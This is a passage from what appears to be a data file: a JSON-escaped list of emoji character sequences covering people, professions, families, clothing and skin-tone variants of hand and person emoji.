\"\ud83d\udc68\u200d\ud83c\udf3e\", \"\ud83d\udc69\u200d\ud83c\udf73\", \"\ud83e\uddd1\u200d\ud83c\udf73\", \"\ud83d\udc68\u200d\ud83c\udf73\", \"\ud83d\udc69\u200d\ud83c\udf93\", \"\ud83e\uddd1\u200d\ud83c\udf93\", \"\ud83d\udc68\u200d\ud83c\udf93\", \"\ud83d\udc69\u200d\ud83c\udfa4\", \"\ud83e\uddd1\u200d\ud83c\udfa4\", \"\ud83d\udc68\u200d\ud83c\udfa4\", \"\ud83d\udc69\u200d\ud83c\udfeb\", \"\ud83e\uddd1\u200d\ud83c\udfeb\", \"\ud83d\udc68\u200d\ud83c\udfeb\", \"\ud83d\udc69\u200d\ud83c\udfed\", \"\ud83e\uddd1\u200d\ud83c\udfed\", \"\ud83d\udc68\u200d\ud83c\udfed\", \"\ud83d\udc69\u200d\ud83d\udcbb\", \"\ud83e\uddd1\u200d\ud83d\udcbb\", \"\ud83d\udc68\u200d\ud83d\udcbb\", \"\ud83d\udc69\u200d\ud83d\udcbc\", \"\ud83e\uddd1\u200d\ud83d\udcbc\", \"\ud83d\udc68\u200d\ud83d\udcbc\", \"\ud83d\udc69\u200d\ud83d\udd27\", \"\ud83e\uddd1\u200d\ud83d\udd27\", \"\ud83d\udc68\u200d\ud83d\udd27\", \"\ud83d\udc69\u200d\ud83d\udd2c\", \"\ud83e\uddd1\u200d\ud83d\udd2c\", \"\ud83d\udc68\u200d\ud83d\udd2c\", \"\ud83d\udc69\u200d\ud83c\udfa8\", \"\ud83e\uddd1\u200d\ud83c\udfa8\", \"\ud83d\udc68\u200d\ud83c\udfa8\", \"\ud83d\udc69\u200d\ud83d\ude92\", \"\ud83e\uddd1\u200d\ud83d\ude92\", \"\ud83d\udc68\u200d\ud83d\ude92\", \"\ud83d\udc69\u200d\u2708\ufe0f\", \"\ud83e\uddd1\u200d\u2708\ufe0f\", \"\ud83d\udc68\u200d\u2708\ufe0f\", \"\ud83d\udc69\u200d\ud83d\ude80\", \"\ud83e\uddd1\u200d\ud83d\ude80\", \"\ud83d\udc68\u200d\ud83d\ude80\", \"\ud83d\udc69\u200d\u2696\ufe0f\", \"\ud83e\uddd1\u200d\u2696\ufe0f\", \"\ud83d\udc68\u200d\u2696\ufe0f\", \"\ud83d\udc70\u200d\u2640\ufe0f\", \"\ud83d\udc70\", \"\ud83d\udc70\u200d\u2642\ufe0f\", \"\ud83e\udd35\u200d\u2640\ufe0f\", \"\ud83e\udd35\", \"\ud83e\udd35\u200d\u2642\ufe0f\", \"\ud83d\udc78\", \"\ud83e\udec5\", \"\ud83e\udd34\", \"\ud83e\udd77\", \"\ud83e\uddb8\u200d\u2640\ufe0f\", \"\ud83e\uddb8\", \"\ud83e\uddb8\u200d\u2642\ufe0f\", \"\ud83e\uddb9\u200d\u2640\ufe0f\", \"\ud83e\uddb9\", \"\ud83e\uddb9\u200d\u2642\ufe0f\", \"\ud83e\udd36\", \"\ud83e\uddd1\u200d\ud83c\udf84\", \"\ud83c\udf85\", \"\ud83e\uddd9\u200d\u2640\ufe0f\", \"\ud83e\uddd9\", \"\ud83e\uddd9\u200d\u2642\ufe0f\", \"\ud83e\udddd\u200d\u2640\ufe0f\", \"\ud83e\udddd\", \"\ud83e\udddd\u200d\u2642\ufe0f\", \"\ud83e\udddb\u200d\u2640\ufe0f\", \"\ud83e\udddb\", \"\ud83e\udddb\u200d\u2642\ufe0f\", \"\ud83e\udddf\u200d\u2640\ufe0f\", \"\ud83e\udddf\", \"\ud83e\udddf\u200d\u2642\ufe0f\", \"\ud83e\uddde\u200d\u2640\ufe0f\", \"\ud83e\uddde\", \"\ud83e\uddde\u200d\u2642\ufe0f\", \"\ud83e\udddc\u200d\u2640\ufe0f\", \"\ud83e\udddc\", \"\ud83e\udddc\u200d\u2642\ufe0f\", \"\ud83e\uddda\u200d\u2640\ufe0f\", \"\ud83e\uddda\", \"\ud83e\uddda\u200d\u2642\ufe0f\", \"\ud83e\uddcc\", \"\ud83d\udc7c\", \"\ud83e\udd30\", \"\ud83e\udec4\", \"\ud83e\udec3\", \"\ud83e\udd31\", \"\ud83d\udc69\u200d\ud83c\udf7c\", \"\ud83e\uddd1\u200d\ud83c\udf7c\", \"\ud83d\udc68\u200d\ud83c\udf7c\", \"\ud83d\ude47\u200d\u2640\ufe0f\", \"\ud83d\ude47\", \"\ud83d\ude47\u200d\u2642\ufe0f\", \"\ud83d\udc81\u200d\u2640\ufe0f\", \"\ud83d\udc81\", \"\ud83d\udc81\u200d\u2642\ufe0f\", \"\ud83d\ude45\u200d\u2640\ufe0f\", \"\ud83d\ude45\", \"\ud83d\ude45\u200d\u2642\ufe0f\", \"\ud83d\ude46\u200d\u2640\ufe0f\", \"\ud83d\ude46\", \"\ud83d\ude46\u200d\u2642\ufe0f\", \"\ud83d\ude4b\u200d\u2640\ufe0f\", \"\ud83d\ude4b\", \"\ud83d\ude4b\u200d\u2642\ufe0f\", \"\ud83e\uddcf\u200d\u2640\ufe0f\", \"\ud83e\uddcf\", \"\ud83e\uddcf\u200d\u2642\ufe0f\", \"\ud83e\udd26\u200d\u2640\ufe0f\", \"\ud83e\udd26\", \"\ud83e\udd26\u200d\u2642\ufe0f\", \"\ud83e\udd37\u200d\u2640\ufe0f\", \"\ud83e\udd37\", \"\ud83e\udd37\u200d\u2642\ufe0f\", \"\ud83d\ude4e\u200d\u2640\ufe0f\", \"\ud83d\ude4e\", \"\ud83d\ude4e\u200d\u2642\ufe0f\", \"\ud83d\ude4d\u200d\u2640\ufe0f\", \"\ud83d\ude4d\", \"\ud83d\ude4d\u200d\u2642\ufe0f\", \"\ud83d\udc87\u200d\u2640\ufe0f\", \"\ud83d\udc87\", \"\ud83d\udc87\u200d\u2642\ufe0f\", \"\ud83d\udc86\u200d\u2640\ufe0f\", \"\ud83d\udc86\", \"\ud83d\udc86\u200d\u2642\ufe0f\", \"\ud83e\uddd6\u200d\u2640\ufe0f\", \"\ud83e\uddd6\", \"\ud83e\uddd6\u200d\u2642\ufe0f\", \"\ud83d\udc85\", \"\ud83d\udc83\", \"\ud83d\udd7a\", \"\ud83d\udc6f\u200d\u2640\ufe0f\", \"\ud83d\udc6f\", \"\ud83d\udc6f\u200d\u2642\ufe0f\", \"\ud83d\udd74\", \"\ud83d\udc69\u200d\ud83e\uddbd\", \"\ud83e\uddd1\u200d\ud83e\uddbd\", \"\ud83d\udc68\u200d\ud83e\uddbd\", \"\ud83d\udc69\u200d\ud83e\uddbc\", \"\ud83e\uddd1\u200d\ud83e\uddbc\", \"\ud83d\udc68\u200d\ud83e\uddbc\", \"\ud83d\udeb6\u200d\u2640\ufe0f\", \"\ud83d\udeb6\", \"\ud83d\udeb6\u200d\u2642\ufe0f\", \"\ud83d\udc69\u200d\ud83e\uddaf\", \"\ud83e\uddd1\u200d\ud83e\uddaf\", \"\ud83d\udc68\u200d\ud83e\uddaf\", \"\ud83e\uddce\u200d\u2640\ufe0f\", \"\ud83e\uddce\", \"\ud83e\uddce\u200d\u2642\ufe0f\", \"\ud83c\udfc3\u200d\u2640\ufe0f\", \"\ud83c\udfc3\", \"\ud83c\udfc3\u200d\u2642\ufe0f\", \"\ud83e\uddcd\u200d\u2640\ufe0f\", \"\ud83e\uddcd\", \"\ud83e\uddcd\u200d\u2642\ufe0f\", \"\ud83d\udc6d\", \"\ud83e\uddd1\u200d\ud83e\udd1d\u200d\ud83e\uddd1\", \"\ud83d\udc6c\", \"\ud83d\udc6b\", \"\ud83d\udc69\u200d\u2764\ufe0f\u200d\ud83d\udc69\", \"\ud83d\udc91\", \"\ud83d\udc68\u200d\u2764\ufe0f\u200d\ud83d\udc68\", \"\ud83d\udc69\u200d\u2764\ufe0f\u200d\ud83d\udc68\", \"\ud83d\udc69\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\", \"\ud83d\udc8f\", \"\ud83d\udc68\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\", \"\ud83d\udc69\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\", \"\ud83d\udc6a\", \"\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc66\", \"\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc67\", \"\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc66\", \"\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc66\u200d\ud83d\udc66\", \"\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc67\", \"\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc66\", \"\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc67\", \"\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc67\u200d\ud83d\udc66\", \"\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc66\u200d\ud83d\udc66\", \"\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc67\u200d\ud83d\udc67\", \"\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc66\", \"\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc67\", \"\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc66\", \"\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc66\u200d\ud83d\udc66\", \"\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc67\", \"\ud83d\udc68\u200d\ud83d\udc66\", \"\ud83d\udc68\u200d\ud83d\udc66\u200d\ud83d\udc66\", \"\ud83d\udc68\u200d\ud83d\udc67\", \"\ud83d\udc68\u200d\ud83d\udc67\u200d\ud83d\udc66\", \"\ud83d\udc68\u200d\ud83d\udc67\u200d\ud83d\udc67\", \"\ud83d\udc69\u200d\ud83d\udc66\", \"\ud83d\udc69\u200d\ud83d\udc66\u200d\ud83d\udc66\", \"\ud83d\udc69\u200d\ud83d\udc67\", \"\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc66\", \"\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc67\", \"\ud83d\udde3\", \"\ud83d\udc64\", \"\ud83d\udc65\", \"\ud83e\udec2\", \"\ud83e\uddf3\", \"\ud83c\udf02\", \"\u2602\ufe0f\", \"\ud83e\uddf5\", \"\ud83e\udea1\", \"\ud83e\udea2\", \"\ud83e\uddf6\", \"\ud83d\udc53\", \"\ud83d\udd76\", \"\ud83e\udd7d\", \"\ud83e\udd7c\", \"\ud83e\uddba\", \"\ud83d\udc54\", \"\ud83d\udc55\", \"\ud83d\udc56\", \"\ud83e\udde3\", \"\ud83e\udde4\", \"\ud83e\udde5\", \"\ud83e\udde6\", \"\ud83d\udc57\", \"\ud83d\udc58\", \"\ud83e\udd7b\", \"\ud83e\ude74\", \"\ud83e\ude71\", \"\ud83e\ude72\", \"\ud83e\ude73\", \"\ud83d\udc59\", \"\ud83d\udc5a\", \"\ud83d\udc5b\", \"\ud83d\udc5c\", \"\ud83d\udc5d\", \"\ud83c\udf92\", \"\ud83d\udc5e\", \"\ud83d\udc5f\", \"\ud83e\udd7e\", \"\ud83e\udd7f\", \"\ud83d\udc60\", \"\ud83d\udc61\", \"\ud83e\ude70\", \"\ud83d\udc62\", \"\ud83d\udc51\", \"\ud83d\udc52\", \"\ud83c\udfa9\", \"\ud83c\udf93\", \"\ud83e\udde2\", \"\u26d1\", \"\ud83e\ude96\", \"\ud83d\udc84\", \"\ud83d\udc8d\", \"\ud83d\udcbc\", \"\ud83d\udc4b\ud83c\udffb\", \"\ud83e\udd1a\ud83c\udffb\", \"\ud83d\udd90\ud83c\udffb\", \"\u270b\ud83c\udffb\", \"\ud83d\udd96\ud83c\udffb\", \"\ud83d\udc4c\ud83c\udffb\", \"\ud83e\udd0c\ud83c\udffb\", \"\ud83e\udd0f\ud83c\udffb\", \"\u270c\ud83c\udffb\", \"\ud83e\udd1e\ud83c\udffb\", \"\ud83e\udef0\ud83c\udffb\", \"\ud83e\udd1f\ud83c\udffb\", \"\ud83e\udd18\ud83c\udffb\", \"\ud83e\udd19\ud83c\udffb\", \"\ud83e\udef5\ud83c\udffb\", \"\ud83e\udef1\ud83c\udffb\", \"\ud83e\udef2\ud83c\udffb\", \"\ud83e\udef3\ud83c\udffb\", \"\ud83e\udef4\ud83c\udffb\", \"\ud83d\udc48\ud83c\udffb\", \"\ud83d\udc49\ud83c\udffb\", \"\ud83d\udc46\ud83c\udffb\", \"\ud83d\udd95\ud83c\udffb\", \"\ud83d\udc47\ud83c\udffb\", \"\u261d\ud83c\udffb\", \"\ud83d\udc4d\ud83c\udffb\", \"\ud83d\udc4e\ud83c\udffb\", \"\u270a\ud83c\udffb\", \"\ud83d\udc4a\ud83c\udffb\", \"\ud83e\udd1b\ud83c\udffb\", \"\ud83e\udd1c\ud83c\udffb\", \"\ud83d\udc4f\ud83c\udffb\", \"\ud83e\udef6\ud83c\udffb\", \"\ud83d\ude4c\ud83c\udffb\", \"\ud83d\udc50\ud83c\udffb\", \"\ud83e\udd32\ud83c\udffb\", \"\ud83d\ude4f\ud83c\udffb\", \"\u270d\ud83c\udffb\", \"\ud83d\udcaa\ud83c\udffb\", \"\ud83e\uddb5\ud83c\udffb\", \"\ud83e\uddb6\ud83c\udffb\", \"\ud83d\udc42\ud83c\udffb\", \"\ud83e\uddbb\ud83c\udffb\", \"\ud83d\udc43\ud83c\udffb\", \"\ud83d\udc76\ud83c\udffb\", \"\ud83d\udc67\ud83c\udffb\", \"\ud83e\uddd2\ud83c\udffb\", \"\ud83d\udc66\ud83c\udffb\", \"\ud83d\udc69\ud83c\udffb\", \"\ud83e\uddd1\ud83c\udffb\", \"\ud83d\udc68\ud83c\udffb\", \"\ud83d\udc69\ud83c\udffb\u200d\ud83e\uddb1\", \"\ud83e\uddd1\ud83c\udffb\u200d\ud83e\uddb1\", \"\ud83d\udc68\ud83c\udffb\u200d\ud83e\uddb1\", \"\ud83d\udc69\ud83c\udffb\u200d\ud83e\uddb0\", \"\ud83e\uddd1\ud83c\udffb\u200d\ud83e\uddb0\", \"\ud83d\udc68\ud83c\udffb\u200d\ud83e\uddb0\", \"\ud83d\udc71\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83d\udc71\ud83c\udffb\", \"\ud83d\udc71\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83d\udc69\ud83c\udffb\u200d\ud83e\uddb3\", \"\ud83e\uddd1\ud83c\udffb\u200d\ud83e\uddb3\", \"\ud83d\udc68\ud83c\udffb\u200d\ud83e\uddb3\", \"\ud83d\udc69\ud83c\udffb\u200d\ud83e\uddb2\", \"\ud83e\uddd1\ud83c\udffb\u200d\ud83e\uddb2\", \"\ud83d\udc68\ud83c\udffb\u200d\ud83e\uddb2\", \"\ud83e\uddd4\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83e\uddd4\ud83c\udffb\", \"\ud83e\uddd4\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83d\udc75\ud83c\udffb\", \"\ud83e\uddd3\ud83c\udffb\", \"\ud83d\udc74\ud83c\udffb\", \"\ud83d\udc72\ud83c\udffb\", \"\ud83d\udc73\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83d\udc73\ud83c\udffb\", \"\ud83d\udc73\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83e\uddd5\ud83c\udffb\", \"\ud83d\udc6e\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83d\udc6e\ud83c\udffb\", \"\ud83d\udc6e\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83d\udc77\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83d\udc77\ud83c\udffb\", \"\ud83d\udc77\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83d\udc82\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83d\udc82\ud83c\udffb\", \"\ud83d\udc82\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83d\udd75\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83d\udd75\ud83c\udffb\", \"\ud83d\udd75\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83d\udc69\ud83c\udffb\u200d\u2695\ufe0f\", \"\ud83e\uddd1\ud83c\udffb\u200d\u2695\ufe0f\", \"\ud83d\udc68\ud83c\udffb\u200d\u2695\ufe0f\", \"\ud83d\udc69\ud83c\udffb\u200d\ud83c\udf3e\", \"\ud83e\uddd1\ud83c\udffb\u200d\ud83c\udf3e\", \"\ud83d\udc68\ud83c\udffb\u200d\ud83c\udf3e\", \"\ud83d\udc69\ud83c\udffb\u200d\ud83c\udf73\", \"\ud83e\uddd1\ud83c\udffb\u200d\ud83c\udf73\", \"\ud83d\udc68\ud83c\udffb\u200d\ud83c\udf73\", \"\ud83d\udc69\ud83c\udffb\u200d\ud83c\udf93\", \"\ud83e\uddd1\ud83c\udffb\u200d\ud83c\udf93\", \"\ud83d\udc68\ud83c\udffb\u200d\ud83c\udf93\", \"\ud83d\udc69\ud83c\udffb\u200d\ud83c\udfa4\", \"\ud83e\uddd1\ud83c\udffb\u200d\ud83c\udfa4\", \"\ud83d\udc68\ud83c\udffb\u200d\ud83c\udfa4\", \"\ud83d\udc69\ud83c\udffb\u200d\ud83c\udfeb\", \"\ud83e\uddd1\ud83c\udffb\u200d\ud83c\udfeb\", \"\ud83d\udc68\ud83c\udffb\u200d\ud83c\udfeb\", \"\ud83d\udc69\ud83c\udffb\u200d\ud83c\udfed\", \"\ud83e\uddd1\ud83c\udffb\u200d\ud83c\udfed\", \"\ud83d\udc68\ud83c\udffb\u200d\ud83c\udfed\", \"\ud83d\udc69\ud83c\udffb\u200d\ud83d\udcbb\", \"\ud83e\uddd1\ud83c\udffb\u200d\ud83d\udcbb\", \"\ud83d\udc68\ud83c\udffb\u200d\ud83d\udcbb\", \"\ud83d\udc69\ud83c\udffb\u200d\ud83d\udcbc\", \"\ud83e\uddd1\ud83c\udffb\u200d\ud83d\udcbc\", \"\ud83d\udc68\ud83c\udffb\u200d\ud83d\udcbc\", \"\ud83d\udc69\ud83c\udffb\u200d\ud83d\udd27\", \"\ud83e\uddd1\ud83c\udffb\u200d\ud83d\udd27\", \"\ud83d\udc68\ud83c\udffb\u200d\ud83d\udd27\", \"\ud83d\udc69\ud83c\udffb\u200d\ud83d\udd2c\", \"\ud83e\uddd1\ud83c\udffb\u200d\ud83d\udd2c\", \"\ud83d\udc68\ud83c\udffb\u200d\ud83d\udd2c\", \"\ud83d\udc69\ud83c\udffb\u200d\ud83c\udfa8\", \"\ud83e\uddd1\ud83c\udffb\u200d\ud83c\udfa8\", \"\ud83d\udc68\ud83c\udffb\u200d\ud83c\udfa8\", \"\ud83d\udc69\ud83c\udffb\u200d\ud83d\ude92\", \"\ud83e\uddd1\ud83c\udffb\u200d\ud83d\ude92\", \"\ud83d\udc68\ud83c\udffb\u200d\ud83d\ude92\", \"\ud83d\udc69\ud83c\udffb\u200d\u2708\ufe0f\", \"\ud83e\uddd1\ud83c\udffb\u200d\u2708\ufe0f\", \"\ud83d\udc68\ud83c\udffb\u200d\u2708\ufe0f\", \"\ud83d\udc69\ud83c\udffb\u200d\ud83d\ude80\", \"\ud83e\uddd1\ud83c\udffb\u200d\ud83d\ude80\", \"\ud83d\udc68\ud83c\udffb\u200d\ud83d\ude80\", \"\ud83d\udc69\ud83c\udffb\u200d\u2696\ufe0f\", \"\ud83e\uddd1\ud83c\udffb\u200d\u2696\ufe0f\", \"\ud83d\udc68\ud83c\udffb\u200d\u2696\ufe0f\", \"\ud83d\udc70\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83d\udc70\ud83c\udffb\", \"\ud83d\udc70\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83e\udd35\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83e\udd35\ud83c\udffb\", \"\ud83e\udd35\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83d\udc78\ud83c\udffb\", \"\ud83e\udec5\ud83c\udffb\", \"\ud83e\udd34\ud83c\udffb\", \"\ud83e\udd77\ud83c\udffb\", \"\ud83e\uddb8\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83e\uddb8\ud83c\udffb\", \"\ud83e\uddb8\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83e\uddb9\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83e\uddb9\ud83c\udffb\", \"\ud83e\uddb9\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83e\udd36\ud83c\udffb\", \"\ud83e\uddd1\ud83c\udffb\u200d\ud83c\udf84\", \"\ud83c\udf85\ud83c\udffb\", \"\ud83e\uddd9\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83e\uddd9\ud83c\udffb\", \"\ud83e\uddd9\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83e\udddd\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83e\udddd\ud83c\udffb\", \"\ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83e\udddb\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83e\udddb\ud83c\udffb\", \"\ud83e\udddb\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83e\udddc\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83e\udddc\ud83c\udffb\", \"\ud83e\udddc\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83e\uddda\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83e\uddda\ud83c\udffb\", \"\ud83e\uddda\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83d\udc7c\ud83c\udffb\", \"\ud83e\udd30\ud83c\udffb\", \"\ud83e\udec4\ud83c\udffb\", \"\ud83e\udec3\ud83c\udffb\", \"\ud83e\udd31\ud83c\udffb\", \"\ud83d\udc69\ud83c\udffb\u200d\ud83c\udf7c\", \"\ud83e\uddd1\ud83c\udffb\u200d\ud83c\udf7c\", \"\ud83d\udc68\ud83c\udffb\u200d\ud83c\udf7c\", \"\ud83d\ude47\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83d\ude47\ud83c\udffb\", \"\ud83d\ude47\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83d\udc81\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83d\udc81\ud83c\udffb\", \"\ud83d\udc81\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83d\ude45\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83d\ude45\ud83c\udffb\", \"\ud83d\ude45\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83d\ude46\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83d\ude46\ud83c\udffb\", \"\ud83d\ude46\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83d\ude4b\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83d\ude4b\ud83c\udffb\", \"\ud83d\ude4b\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83e\uddcf\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83e\uddcf\ud83c\udffb\", \"\ud83e\uddcf\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83e\udd26\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83e\udd26\ud83c\udffb\", \"\ud83e\udd26\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83e\udd37\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83e\udd37\ud83c\udffb\", \"\ud83e\udd37\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83d\ude4e\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83d\ude4e\ud83c\udffb\", \"\ud83d\ude4e\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83d\ude4d\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83d\ude4d\ud83c\udffb\", \"\ud83d\ude4d\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83d\udc87\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83d\udc87\ud83c\udffb\", \"\ud83d\udc87\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83d\udc86\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83d\udc86\ud83c\udffb\", \"\ud83d\udc86\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83e\uddd6\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83e\uddd6\ud83c\udffb\", \"\ud83e\uddd6\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83d\udc83\ud83c\udffb\", \"\ud83d\udd7a\ud83c\udffb\", \"\ud83d\udd74\ud83c\udffb\", \"\ud83d\udc69\ud83c\udffb\u200d\ud83e\uddbd\", \"\ud83e\uddd1\ud83c\udffb\u200d\ud83e\uddbd\", \"\ud83d\udc68\ud83c\udffb\u200d\ud83e\uddbd\", \"\ud83d\udc69\ud83c\udffb\u200d\ud83e\uddbc\", \"\ud83e\uddd1\ud83c\udffb\u200d\ud83e\uddbc\", \"\ud83d\udc68\ud83c\udffb\u200d\ud83e\uddbc\", \"\ud83d\udeb6\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83d\udeb6\ud83c\udffb\", \"\ud83d\udeb6\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83d\udc69\ud83c\udffb\u200d\ud83e\uddaf\", \"\ud83e\uddd1\ud83c\udffb\u200d\ud83e\uddaf\", \"\ud83d\udc68\ud83c\udffb\u200d\ud83e\uddaf\", \"\ud83e\uddce\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83e\uddce\ud83c\udffb\", \"\ud83e\uddce\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83c\udfc3\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83c\udfc3\ud83c\udffb\", \"\ud83c\udfc3\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83e\uddcd\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83e\uddcd\ud83c\udffb\", \"\ud83e\uddcd\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83d\udc6d\ud83c\udffb\", \"\ud83e\uddd1\ud83c\udffb\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c\udffb\", \"\ud83d\udc6c\ud83c\udffb\", \"\ud83d\udc6b\ud83c\udffb\", \"\ud83e\uddd7\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83e\uddd7\ud83c\udffb\", \"\ud83e\uddd7\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83c\udfc7\ud83c\udffb\", \"\ud83c\udfc2\ud83c\udffb\", \"\ud83c\udfcc\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83c\udfcc\ud83c\udffb\", \"\ud83c\udfcc\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83c\udfc4\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83c\udfc4\ud83c\udffb\", \"\ud83c\udfc4\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83d\udea3\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83d\udea3\ud83c\udffb\", \"\ud83d\udea3\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83c\udfca\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83c\udfca\ud83c\udffb\", \"\ud83c\udfca\ud83c\udffb\u200d\u2642\ufe0f\", \"\u26f9\ud83c\udffb\u200d\u2640\ufe0f\", \"\u26f9\ud83c\udffb\", \"\u26f9\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83c\udfcb\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83c\udfcb\ud83c\udffb\", \"\ud83c\udfcb\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83d\udeb4\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83d\udeb4\ud83c\udffb\", \"\ud83d\udeb4\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83d\udeb5\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83d\udeb5\ud83c\udffb\", \"\ud83d\udeb5\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83e\udd38\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83e\udd38\ud83c\udffb\", \"\ud83e\udd38\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83e\udd3d\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83e\udd3d\ud83c\udffb\", \"\ud83e\udd3d\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83e\udd3e\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83e\udd3e\ud83c\udffb\", \"\ud83e\udd3e\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83e\udd39\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83e\udd39\ud83c\udffb\", \"\ud83e\udd39\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83e\uddd8\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83e\uddd8\ud83c\udffb\", \"\ud83e\uddd8\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83d\udec0\ud83c\udffb\", \"\ud83d\udecc\ud83c\udffb\", \"\ud83d\udc4b\ud83c\udffc\", \"\ud83e\udd1a\ud83c\udffc\", \"\ud83d\udd90\ud83c\udffc\", \"\u270b\ud83c\udffc\", \"\ud83d\udd96\ud83c\udffc\", \"\ud83d\udc4c\ud83c\udffc\", \"\ud83e\udd0c\ud83c\udffc\", \"\ud83e\udd0f\ud83c\udffc\", \"\u270c\ud83c\udffc\", \"\ud83e\udd1e\ud83c\udffc\", \"\ud83e\udef0\ud83c\udffc\", \"\ud83e\udd1f\ud83c\udffc\", 